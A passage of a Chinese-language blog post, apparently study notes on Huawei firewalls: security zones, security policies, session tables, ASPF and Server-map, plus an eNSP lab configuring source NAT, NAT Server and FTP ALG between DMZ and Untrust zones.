id="AI防火墙"><a href="#AI防火墙" class="headerlink" title="AI防火墙"></a>AI防火墙</h5><p>AI防火墙是结合AI技术的<del>新一代防火墙</del>它通过结合AI算法或AI芯片等多种方式，进一步提高了防火墙的安全防护能力和性能</p><blockquote><p>此处也是存有一些需要自行考证，NGFW这个定义在我本科阶段大创中以经开始尝试实现结合人工智能和状态检查技术和大数据的网<strong>络态势感知系统</strong>，AI 防火墙或许以及无法担起NGFW（下一代防火墙）的称呼，以经从学科前沿，转为可以方便接触的内容</p></blockquote><p><del>华为AI防火墙，内置的恶意文件检测引擎CDE、诱捕Sensor、APT检测引擎和探针，支持与沙箱和华为大数据分析平台CIS联动检测，打造智能防御体系</del></p><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/AI防火墙.png" style="zoom:50%;" /><h3 id="防火墙的基本概念"><a href="#防火墙的基本概念" class="headerlink" title="防火墙的基本概念"></a>防火墙的基本概念</h3><blockquote><p>安全区域 Security Zone，简称为区域 Zone，是防火墙的重要概念。防火墙大部分安全策略都基于安全区域实施</p></blockquote><p>一个安全区域是防火墙若干接口所连网络的集合，一个区域内的用户具有相同的安全属性</p><h4 id="默认安全区域"><a href="#默认安全区域" class="headerlink" title="默认安全区域"></a>默认安全区域</h4><blockquote><p>华为防火墙确认已创建四个区域，untrust、dmz、trust和local区域</p></blockquote><p>安全区域有以下特性：</p><ul><li>默认的安全区域不能删除，也不允许修改安全优先级</li><li>每个Zone都必须设置一个安全优先级Priority，值越大，则Zone的安全优先级越高</li><li>用户可根据自己的需求创建自定义的Zone</li></ul><table><thead><tr><th><strong>区域名称</strong></th><th><strong>默认安全优先级</strong></th></tr></thead><tbody><tr><td>非受信区域</td><td>低安全级别区域，优先级为5</td></tr><tr><td>非军事化区</td><td>中等安全级别区域，优先级为50</td></tr><tr><td>受信区域</td><td>较高安全级别区域，优先级为85</td></tr><tr><td>本地区域</td><td>Local区域定义的是设备本身,Local区域是最高安全级别区域，优先级为100</td></tr></tbody></table><p>防火墙默认安全区域均为小写字母，且大小写敏感，包括：</p><ul><li>非受信区域（untrust）：通常用于定义Internet等不安全的网络</li><li>非军事化区域（dmz）：通常用于定义内网服务器所在区域。因为这种设备虽然部署在内网，但是经常需要被外网访问，存在较大安全隐患，同时一般又不允许其主动访问外网，所以将其部署一个优先级比trust低，但是比untrust高的安全区域中<ul><li>DMZ（Demilitarized Zone）起源于军方，是介于严格的军事管制区和松散的公共区域之间的一种有着部分管制的区域。防火墙设备引用了这一术语，指代一个逻辑上和物理上都与内部网络和外部网络分离的安全区域</li><li>DMZ安全区域很好地解决了服务器的放置问题。该安全区域可以放置需要对外提供网络服务的设备，如WWW服务器、FTP服务器等。上述服务器如果放置于内部网络，外部恶意用户则有可能利用某些服务的安全漏洞攻击内部网络；如果放置于外部网络，则无法保障它们的安全</li></ul></li><li>受信区域（trust）：通常用于定义内网终端用户所在区域</li><li>本地区域（local）：local区域定义的是设备本身，包括设备的各接口本身。凡是由设备构造并主动发出的报文均可认为是从Local区域中发出，凡是需要设备响应并处理（而不仅是检测或直接转发）的报文均可认为是由local区域接收。用户不能改变local区域本身的任何配置，包括向其中添加接口<br>由于local区域的特殊性，在很多需要设备本身进行报文收发的应用中，需要开放对端所在安全区域与local区域之间的安全策略</li></ul><h4 id="防火墙基本概念：安全策略"><a href="#防火墙基本概念：安全策略" class="headerlink" title="防火墙基本概念：安全策略"></a>防火墙基本概念：安全策略</h4><blockquote><p><font color="RED"><strong>安全策略是控制防火墙对流量转发以及对流量进行内容安全一体化检测的策略</strong></font></p></blockquote><p>当防火墙收到流量后，对流量的属性（五元组、用户、时间段等）进行识别，然后与安全策略的条件进行匹配。如果条件匹配，则此流量被执行对应的动作</p><blockquote><p>五元组 即IP协议五元组 分别是 源端口 目的端口 源IP 目的IP 及协议字段组成，用于标识一个会话</p></blockquote><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/安全策略.png" style="zoom:50%;" /><h5 id="安全策略执行过程："><a href="#安全策略执行过程：" class="headerlink" title="安全策略执行过程："></a>安全策略执行过程：</h5><ul><li>安全策略的组成有匹配条件、动作和安全配置文件，安全配置文件实现内容安全</li><li>安全策略动作如果为“允许”则可配置安全配置文件，如果为“禁止”则可配置反馈报文</li></ul><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/安全策略执行过程.png" style="zoom:33%;" /><p><strong>动作说明：</strong></p><ul><li><p>允许：如果动作为允许，则对流量进行如下处理：</p><ul><li>如果没有配置内容安全检测，则允许流量通过</li><li>如果配置内容安全检测，最终根据内容安全检测的结论来判断是否对流量进行放行。内容安全检测包括反病毒、入侵防御等，它是通过在安全策略中引用安全配置文件实现的<ul><li>如果其中一个安全配置文件阻断该流量，则防火墙阻断该流量</li><li>如果所有的安全配置文件都允许该流量转发，则防火墙允许该流量转发</li></ul></li></ul></li><li><p>禁止：表示拒绝符合条件的流量通过</p><ul><li>如果动作为“禁止”，防火墙可以将报文丢弃，还可以针对不同的报文类型选择发送对应的反馈报文。发起连接请求的客户端/服务器收到防火墙发送的阻断报文后，可以快速结束会话并让用户感知到请求被阻断<ul><li>Reset客户端：防火墙向TCP客户端发送TCP reset报文</li><li>Reset服务器：防火墙向TCP服务器发送TCP reset报文</li><li>ICMP不可达：FW向报文客户端发送ICMP不可达报文</li></ul></li></ul></li><li><p>当配置多条安全策略规则时，安全策略的匹配按照策略列表的顺序执行，即从策略列表顶端开始逐条向下匹配。如果流量匹配了某个安全策略，将不再进行下一个策略的匹配</p></li><li><p>安全策略的配置顺序很重要，需要先配置条件精确的策略，再配置宽泛的策略</p></li></ul><h4 id="防火墙基本概念：会话表"><a href="#防火墙基本概念：会话表" class="headerlink" title="防火墙基本概念：会话表"></a>防火墙基本概念：会话表</h4><blockquote><ul><li><font color="skyblue"><strong>会话表是用来记录TCP、UDP、ICMP等协议连接状态的表项，是防火墙转发报文的重要依据</strong></font></li></ul></blockquote><p>防火墙采用了<font color="FF6600"><strong>基于状态的报文控制机制</strong></font>：<font color="FF6600">只对首包或者少量报文进行检测就确定一条连接的状态，大量报文直接根据所属连接的状态进行控制</font></p><p>这种状态检测机制迅速提高了防火墙的检测和转发效率。会话表就是为了记录连接的状态而存在的。设备在转发TCP、UDP和ICMP报文时都需要查询会话表，来判断该报文所属的连接并采取相应的处理措施</p><h5 id="会话表的创建和包处理过程"><a href="#会话表的创建和包处理过程" class="headerlink" title="会话表的创建和包处理过程"></a>会话表的创建和包处理过程</h5><ul><li>防火墙状态检测开启情况下，流量的首包会创建会话表项，后续包即可直接匹配会话表项。</li></ul><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/会话表的创建和包处理过程.png" style="zoom: 50%;" /><h5 id="会话表的老化时间与长连接"><a href="#会话表的老化时间与长连接" class="headerlink" title="会话表的老化时间与长连接"></a>会话表的老化时间与长连接</h5><ul><li><p>防火墙为各种协议设定了会话老化机制。当一条会话在老化时间内没有被任何报文匹配，则会被从会话表中删除。这种机制可以避免防火墙的设备资源被大量无用、陈旧的会话表项消耗。</p></li><li><p>对于某些特殊业务中，一条会话的两个连续报文可能间隔时间很长 </p><ul><li>用户通过FTP下载大文件，需要间隔很长时间才会在控制通道继续发送控制报文</li><li>用户需要查询数据库服务器上的数据，这些查询操作的时间间隔远大于TCP的会话老化时间</li></ul></li><li><p>如果会话表项被删除，则上述业务会中断，长连接 Long Link机制可以给部分连接设定超长的老化时间，解决解决因会话不爱老化导致的链接中断问题。</p></li></ul><h4 id="多通道协议在防火墙上的问题"><a href="#多通道协议在防火墙上的问题" class="headerlink" title="多通道协议在防火墙上的问题"></a>多通道协议在防火墙上的问题</h4><p>如果在防火墙上配置严格的单向安全策略，那么防火墙将只允许业务单方向发起访问。这会导致一些特殊的协议无法工作</p><blockquote><p><font color="FF6300">通信过程中<strong>需占用两个或两个以上端口的协议被称为多通道协议</strong>，多通道协议需要考虑双向安全策略问题</font></p></blockquote><ul><li><strong>单通道协议</strong>：通信过程中只需占用一个端口的协议</li><li><strong>多通道协议</strong>：通信过程中需占用两个或两个以上端口的协议<ul><li>多通道协议存在时，防火墙配置较为宽泛的安全策略也可以解决协议不可用问题，但是存在安全隐患</li></ul></li></ul><h5 id="ASPF与Server-map"><a href="#ASPF与Server-map" class="headerlink" title="ASPF与Server-map"></a>ASPF与Server-map</h5><p>为了解决多通道协议的问题，防火墙需要识别协议在应用层协商的地址和端口，需要开启ASPF（针对应用层的包过滤）功能</p><blockquote><p><font color="blue">ASPF也称作<strong>基于状态的报文过滤</strong>，ASPF功能可以自动检测某些报文的应用层信息并根据应用层信息放开相应的访问规则，即生成Server-map表</font></p></blockquote><p>Server-map表也记录了类似会话表中连接的状态。Server-map表中的信息相对简单，是简化的会话表，在真实流量到达前生成。在流量真实到达防火墙时，防火墙会基于Server-map表生成会话表，然后执行转发。<br>开启ASPF解决多通道协议问题，是生成Server-map表的一种方式</p><ul><li>Server-map表与会话表的关系如下：<ul><li>Server-map表记录了应用层数据中的关键信息，报文命中该表后，不再受安全策略的控制；</li><li>会话表是通信双方连接状态的具体体现；</li><li>Server-map表不是当前的连接信息，而是防火墙对当前连接分析后得到的即将到来报文的预测；</li><li>防火墙收到报文先检查是否命中会话表；</li><li>如果没有命中则检查是否命中Server-map表；</li><li>命中Server-map表的报文不受安全策略控制；</li><li>防火墙最后为命中Server-map表的数据创建会话表。</li></ul></li></ul><h5 id="Server-map表与简化的包转发过程："><a href="#Server-map表与简化的包转发过程：" class="headerlink" title="Server-map表与简化的包转发过程："></a>Server-map表与简化的包转发过程：</h5><p>当防火墙接收到一个报文且没有命中会话表时，防火墙进入首包处理流程，查询是否有命中的Server-map表。如果有，则会生成会话表转发报文；如果没有，则执行其他包处理过程</p><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/防火墙Server-map下的包转发流程.png" alt="防火墙Server-map下的包转发流程" style="zoom:50%;" /><h3 id="防火墙的基础配置"><a href="#防火墙的基础配置" class="headerlink" title="防火墙的基础配置"></a>防火墙的基础配置</h3><h4 id="防火墙基础配置命令"><a href="#防火墙基础配置命令" class="headerlink" title="防火墙基础配置命令"></a>防火墙基础配置命令</h4><h5 id="防火墙基础配置-接口"><a href="#防火墙基础配置-接口" class="headerlink" title="防火墙基础配置 - 接口"></a>防火墙基础配置 - 接口</h5><p>1 创建接口/进入接口视图</p><pre class="line-numbers language-none"><code class="language-none">[R1] interface interface-type interface-number<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>和交换机、路由器相同，interface命令用来创建接口或进入指定的接口视图</p><p>2 配置接口允许通过的协议</p><pre class="line-numbers language-none"><code class="language-none">[R1-G0&#x2F;0&#x2F;1] service-manage &#123;http|https|ping|ssh|snmp|netconf|telnet|all &#125; &#123;permit|deny&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>service-manage命令用来允许或拒绝管理员通过HTTPS、Ping、SSH、SNMP、NETCONF以及Telnet访问设备<br>缺省情况下，接口开启了访问控制管理功能。仅有管理接口下 HTTP、HTTPS、Ping权限放开。非管理口所有权限都关闭。此时，即使配置了接口所在安全域允许访问local区域的安全策略，也不能通过该接口访问本地防火墙</p><h5 id="防火墙基础配置-安全区域"><a href="#防火墙基础配置-安全区域" class="headerlink" title="防火墙基础配置 - 安全区域"></a>防火墙基础配置 - 安全区域</h5><p>1 创建安全区域</p><pre class="line-numbers language-none"><code class="language-none">[R1] firewall zone name zone-name [ id id ]  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>firewall zone name命令创建安全区域，并进入安全区域视图。id表示安全区域ID，取值4～99，默认递增</p></li><li><p>firewall zone命令用来并进入安全区域视图。防火墙默认的四个区域无需创建也不能删除</p></li></ul><p>2 设置安全区域优先级</p><pre class="line-numbers language-none"><code class="language-none">[R1-zone-name] set priority security-priority<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>优先级取值范围为1～100，全局唯一，值越大优先级越高。系统默认的安全区域不能被删除，优先级也无法被重新配置或者删除</p><p>3 添加接口到安全区域</p><pre class="line-numbers language-none"><code class="language-none">[R1-zone-name] add interface interface-type &#123;interface-number|interface-number.subinterface-number&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安全区域在使用时需要与防火墙的特定接口相关联，即需要将接口加入到安全区域。该接口既可以是物理接口，也可以是逻辑接口</p><h5 id="防火墙基础配置-安全策略"><a href="#防火墙基础配置-安全策略" class="headerlink" title="防火墙基础配置 - 安全策略"></a>防火墙基础配置 - 安全策略</h5><p>1 进入安全策略视图</p><pre class="line-numbers language-none"><code class="language-none">[R1] security-policy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>安全策略规则的创建、复制、移动和重命名都在此视图下完成。</li></ul><p>2 创建规则</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security] rule name rule-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>rule name命令用来创建安全策略规则，并进入安全策略规则视图。</li></ul><p>3 配置安全策略规则的源安全区域</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security-rule-name] source-zone &#123; zone-name &amp;&lt;1-6&gt; | any &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>命令中zone-name必须为系统已经存在的安全区域名称。安全策略规则一次最多添加或删除6个安全区域</li></ul><p>4 配置安全策略规则的目的安全区域</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security-rule-name] destination-zone &#123; zone-name &amp;&lt;1-6&gt; | any &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5 配置安全策略规则的源IP地址</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security-rule-name] source-address ipv4-address &#123;ipv4-mask-length|mask mask-address&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>命令中mask-address使用反掩码</li></ul><p>6  配置安全策略规则的目的IP地址</p><pre class="line-numbers language-none"><code class="language-none">[R1-policy-security-rule-name] destination-address ipv4-address &#123;ipv4-mask-length|mask mask-address&#125; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>命令中mask-address使用反掩码</li></ul><p>7 配置服务</p><pre class="line-numbers language-none"><code class="language-none">[Huawei] service &#123; service-name &amp;&lt;1-6&gt; | any &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>service命令用来配置服务，如service protocol用来在安全策略中直接引用TCP/UDP/SCTP端口或IP层协议</li></ul><p>8 配置安全策略规则的动作</p><pre class="line-numbers language-none"><code class="language-none">[Huawei] action &#123; permit | deny &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>防火墙默认的动作为deny</li></ul><h3 id="防火墙安全策略配置实验"><a href="#防火墙安全策略配置实验" class="headerlink" title="防火墙安全策略配置实验"></a>防火墙安全策略配置实验</h3><img src="https://shierjinghuang.github.io/2023/04/16/华为防火墙技术/防火墙安全策略配置实验拓扑.jpg" style="zoom:67%;" /><center>防火墙安全策略拓扑</center>设备互联方式、IP地址规划如图所示，R1、R2通过交换机S1与防火墙进行三层通信，S1上将连接R1、R2的接口分别划分到VLAN10、20，将连接防火墙的接口GE0/0/14、GE0/0/15分别划分到VLAN10、20。<p>R1属于DMZ（Demilitarized Zone，非军事化）区域、R2属于Untrust区域，在FW1上配置源NAT使得R1以FW1的GE0/0/2接口地址访问Untrust区域，同时配置NAT Server，使得R2可以通过FW1的GE0/0/2接口地址访问R1上开启的FTP服务。</p><p>在FW1上配置安全策略，限制R1、R2之间的访问：DMZ区域的R1对Untrust区域的访问不受任何限制，但是Untrust区域只能主动访问DMZ区域中R1上的FTP服务。</p><h4 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h4><p>为了保护企业网络安全，需要在企业网络边界部署一台防火墙，限制外部网络对企业内部网络的主动访问，同时作为出口设备，需要在防火墙上部署源NAT[用于内部用户访问Internet]、NAT Server[将内网服务器映射到公网]</p><p>企业内部对外提供访问的服务为FTP服务，FTP协议为多通道协议，对于多通道协议，除了部署安全策略之外，还需要借助NAT ALG才能实现经过防火墙NAT之后依旧能够正常通信。</p><h4 id="任务步骤"><a href="#任务步骤" class="headerlink" title="任务步骤"></a>任务步骤</h4><h5 id="步骤-1-基础连通性配置"><a href="#步骤-1-基础连通性配置" class="headerlink" title="步骤 1 基础连通性配置"></a>步骤 1 基础连通性配置</h5><ul><li>完成互联接口IP地址配置、交换机VLAN划分配置，在R1、FW1上配置默认路由。</li></ul><p><strong>交换机基础配置</strong></p><pre class="line-numbers language-none"><code class="language-none">[S1]vlan 10[S1-vlan10] description DMZ[S1-vlan10] quit[S1]interface GigabitEthernet0&#x2F;0&#x2F;1[S1-GigabitEthernet0&#x2F;0&#x2F;1] port link-type access[S1-GigabitEthernet0&#x2F;0&#x2F;1] port default vlan 10[S1-GigabitEthernet0&#x2F;0&#x2F;1] quit[S1]interface GigabitEthernet0&#x2F;0&#x2F;14[S1-GigabitEthernet0&#x2F;0&#x2F;14] port link-type access[S1-GigabitEthernet0&#x2F;0&#x2F;14] port default vlan 10[S1-GigabitEthernet0&#x2F;0&#x2F;14] quit[S1]vlan 20[S1-vlan20] description Untrust[S1-vlan20] quit[S1]interface GigabitEthernet0&#x2F;0&#x2F;2[S1-GigabitEthernet0&#x2F;0&#x2F;2] port link-type access[S1-GigabitEthernet0&#x2F;0&#x2F;2] port default vlan 20[S1-GigabitEthernet0&#x2F;0&#x2F;2] quit[S1]interface GigabitEthernet0&#x2F;0&#x2F;15[S1-GigabitEthernet0&#x2F;0&#x2F;15] port link-type access[S1-GigabitEthernet0&#x2F;0&#x2F;15] port default vlan 20[S1-GigabitEthernet0&#x2F;0&#x2F;15] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R1 配置</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1]interface GigabitEthernet0&#x2F;0&#x2F;3[R1-GigabitEthernet0&#x2F;0&#x2F;3] ip address 10.0.11.11 24[R1-GigabitEthernet0&#x2F;0&#x2F;3] quit[R1]ip route-static 0.0.0.0 0.0.0.0 10.0.11.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>配置用于访问Internet的默认路由。</li></ul><p><strong>R2 配置</strong></p><pre class="line-numbers language-none"><code class="language-none">[R2]interface GigabitEthernet0&#x2F;0&#x2F;4[R2-GigabitEthernet0&#x2F;0&#x2F;3] ip address 10.0.12.2 255.255.255.0[R2-GigabitEthernet0&#x2F;0&#x2F;3] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>FW1登录配置</strong></p><pre class="line-numbers language-none"><code class="language-none">Login authenticationUsername:adminPassword:The password needs to be changed. Change now? [Y&#x2F;N]: YPlease enter old password: Please enter new password: Please confirm new password:防火墙的Console接口默认存在认证配置，默认账号密码为：admin&#x2F;Admin@123登录之后需要修改密码才可以正常登录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置FW1接口IP、默认路由</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]interface GigabitEthernet0&#x2F;0&#x2F;1[FW1-GigabitEthernet0&#x2F;0&#x2F;1] ip address 10.0.11.1 255.255.255.0[FW1-GigabitEthernet0&#x2F;0&#x2F;1] quit[FW1]interface GigabitEthernet0&#x2F;0&#x2F;2[FW1-GigabitEthernet0&#x2F;0&#x2F;2] ip address 10.0.12.1 255.255.255.0[FW1-GigabitEthernet0&#x2F;0&#x2F;2] quit[FW1]ip route-static 0.0.0.0 0.0.0.0 10.0.12.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置FW1接口允许通过ping报文</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]interface GigabitEthernet0&#x2F;0&#x2F;1[FW1-GigabitEthernet0&#x2F;0&#x2F;1] service-manage ping permit[FW1-GigabitEthernet0&#x2F;0&#x2F;1] quit[FW1]interface GigabitEthernet0&#x2F;0&#x2F;2[FW1-GigabitEthernet0&#x2F;0&#x2F;2] service-manage ping permit[FW1-GigabitEthernet0&#x2F;0&#x2F;2] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>防火墙的接口缺省开启service-manage，service-manage在接口层面进行安全把控，它决定用户是否能通过该接口管理/访问防火墙（例如通过ping、ssh、telnet、snmp等方式）。GE0/0/0接口是设备的网管接口，该接口缺省便配置了service-manage ping permit、service-manage ssh permit等命令，因此用户能够通过该接口管理防火墙。但是对于其他接口，缺省时防火墙禁止用户从该接口管理/访问自己，除非显式地配置service-manage命令。例如，如果希望允许用户Ping GE1/0/1接口，则需在GE1/0/1接口上配置service-manage ping permit命令，同理如果希望允许用户SSH GE1/0/1接口，则需配置service-manage ssh permit</p><h5 id="步骤-2-配置Local域到其他区域的安全策略规则"><a href="#步骤-2-配置Local域到其他区域的安全策略规则" class="headerlink" title="步骤 2 配置Local域到其他区域的安全策略规则"></a>步骤 2 配置Local域到其他区域的安全策略规则</h5><p>将接口加入到安全域，同时创建一个安全策略规则local_to：</p><ol><li><p>源、目IP不做任何限制</p></li><li><p>目的安全域不限制</p></li><li><p>服务不做任何限制</p></li><li><p>源安全域为Local</p></li><li><p>动作为允许</p></li></ol><p><strong>将接口加入到安全域中</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]firewall zone dmz[FW1-zone-dmz] description DMZ[FW1-zone-dmz] add interface GigabitEthernet0&#x2F;0&#x2F;1[FW1-zone-dmz] quit[FW1]firewall zone untrust[FW1-zone-untrust] description Untrust[FW1-zone-untrust] add interface GigabitEthernet0&#x2F;0&#x2F;2[FW1-zone-untrust] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>创建安全策略规则local_to</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]security-policy[FW1-policy-security] rule name local_to[FW1-policy-security-rule-local_to] source-zone local[FW1-policy-security-rule-local_to] action perit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>未配置源、目IP，目的安全域，服务，默认情况下这些参数为any。</li></ul><p><strong>测试FW1与R1、R2接口IP地址的连通性</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;ping -c 1 10.0.11.11<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="步骤-3-配置源NAT、NAT-Server"><a href="#步骤-3-配置源NAT、NAT-Server" class="headerlink" title="步骤 3 配置源NAT、NAT Server"></a>步骤 3 配置源NAT、NAT Server</h5><ul><li>配置NAPT用于私网用户（R1）访问Internet，配置NAT Server将R1的FTP服务映射到公网。</li></ul><p><strong>配置NAT地址池，配置时开启允许端口地址转换，实现公网地址复用</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]nat address-group 1[FW1-address-group-1] mode pat [FW1-address-group-1] section 0 10.0.12.1 10.0.12.1[FW1-address-group-1] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置源NAT策略，实现私网指定网段访问Internet时自动进行源地址转换</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]nat-policy [FW1-policy-nat] rule name 1[FW1-policy-nat-rule-1] source-zone dmz[FW1-policy-nat-rule-1] destination-zone untrust[FW1-policy-nat-rule-1] source-address 10.0.11.0 24[FW1-policy-nat-rule-1] action source-nat address-group 1[FW1-policy-nat-rule-1] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>配置NAT Server功能，创建静态映射，映射R1的FTP服务</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]nat server policy_ftp protocol tcp global 10.0.12.1 ftp inside 10.0.11.11 ftp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>开启FTP协议的NAT ALG功能</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]firewall zone dmz [FW1-zone-dmz] detect ftp [FW1-zone-dmz] quit[FW1]firewall interzone dmz untrust [FW1-interzone-dmz-untrust] detect ftp [FW1-interzone-dmz-untrust] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="步骤-4-配置DMZ、Untrust区域之间的安全策略规则"><a href="#步骤-4-配置DMZ、Untrust区域之间的安全策略规则" class="headerlink" title="步骤 4 配置DMZ、Untrust区域之间的安全策略规则"></a>步骤 4 配置DMZ、Untrust区域之间的安全策略规则</h5><p>配置安全策略DMZtoUntrust，源地址限制为10.0.11.0/24，动作为允许；配置安全策略Untrust_DMZ，只允许R2访问R1提供的FTP服务。</p><blockquote><ul><li>防火墙安全策略实验 需要使用USG6000V防火墙 USG5500没有security-policy及之后的一些指令 </li><li>同时ENSP软件，并不自带USG6000V防火墙的.vdi文件需要自行下载安装</li><li> 防火墙的Console接口默认存在认证配置，默认账号密码为：admin/Admin@123，登录之后需要修改密码才可以正常登录</li></ul></blockquote><p><strong>创建安全策略规则DMZtoUntrust</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]security-policy[FW1-policy-security] rule name DMZtoUntrust[FW1-policy-security-rule-DMZtoUntrust] source-zone dmz[FW1-policy-security-rule-DMZtoUntrust] destination-zone untrust[FW1-policy-security-rule-DMZtoUntrust] source-address 10.0.11.0 24[FW1-policy-security-rule-DMZtoUntrust] action permit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>创建安全策略规则Untrust_DMZ</strong></p><pre class="line-numbers language-none"><code class="language-none">[FW1]security-policy[FW1-policy-security-rule] rule name Untrust_DMZ[FW1-policy-security-rule-Untrust_DMZ] source-zone untrust[FW1-policy-security-rule-Untrust_DMZ] destination-zone dmz[FW1-policy-security-rule-Untrust_DMZ] destination-address 10.0.11.11 24[FW1-policy-security-rule-Untrust_DMZ] service ftp[FW1-policy-security-rule-Untrust_DMZ] action permit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意目的IP地址为映射的内部地址，安全策略对报文的处理在NAT Server修改报文的目的IP地址之后。</p><h5 id="步骤-5-查看FW1会话"><a href="#步骤-5-查看FW1会话" class="headerlink" title="步骤 5 查看FW1会话"></a>步骤 5 查看FW1会话</h5><p>在R1上ping     R2，查看FW1会话的详细信息。</p><p><strong>测试R1访问R2</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;R1&gt;ping -c 100 10.0.12.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>R1能够经过FW1正常访问R2，此时在FW1上查看相关会话的详细信息。</p><p><strong>查看FW1会话</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;display firewall session table verbose destination global 10.0.12.2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看目的global IP为10.0.12.2的会话详细信息，在输出信息中可以看到该会话的安全域方向：从dmz到untrust，该会话的老化时间（TTL）为20s，接收到报文的接口为GigabitEthernet0/0/1，发送报文的接口为GigabitEthernet0/0/2，一共存在100个匹配中该会话的报文，一共8400Byte。可以看到该会话匹配的安全策略规则名称为：DMZtoUntrust。</p><p>同时从会话中我们可以看到该报文进行了源地址转换，源IP10.0.11.11转换为了10.0.12.1 FW1的GE0/0/2接口地址</p><h5 id="步骤-6-观察NAT-ALG工作过程"><a href="#步骤-6-观察NAT-ALG工作过程" class="headerlink" title="步骤 6 观察NAT ALG工作过程"></a>步骤 6 观察NAT ALG工作过程</h5><p>在R1上开启FTP服务，R2作为FTP客户端通过FW1映射出的地址登录R1的FTP服务，并执行命令<strong>dir</strong>查看文件列表，观察FW1的ASPF如何处理多通道协议。</p><p> <strong>R1上开启FTP服务</strong></p><pre class="line-numbers language-none"><code class="language-none">[R1]aaa[R1-aaa] local-user ftp service-type ftp[R1-aaa] local-user ftp password cipher ftp@123[R1-aaa] local-user ftp privilege level 15[R1-aaa] local-user ftp ftp-directory flash:[R1-aaa] quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>R2访问R1开启的FTP服务，注意是通过FW1上映射的地址进行访问</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;R2&gt;ftp 10.0.12.1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若实验成功实现，则R2可以成功通过FW1的NAT Server映射访问R1开启的FTP服务</p><p><strong>查看FW1的会话表</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;display firewall session table verbose protocol tcp destination-port global<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>当实验完成，执行上述命令可以看到FTP的控制通道已经建立 </li></ul><p><strong>在R2上执行命令dir</strong></p><pre class="line-numbers language-none"><code class="language-none">[ftp]dir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>能够看到R1的文件列表，此时已经使用了FTP的传输通道。</li></ul><p><strong>再次查看FW1的会话表</strong></p><pre class="line-numbers language-none"><code class="language-none">&lt;FW1&gt;display firewall session table <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>依旧只存在FTP控制通道会话，并无传输通道会话。</li></ul><p><strong>查看NAT 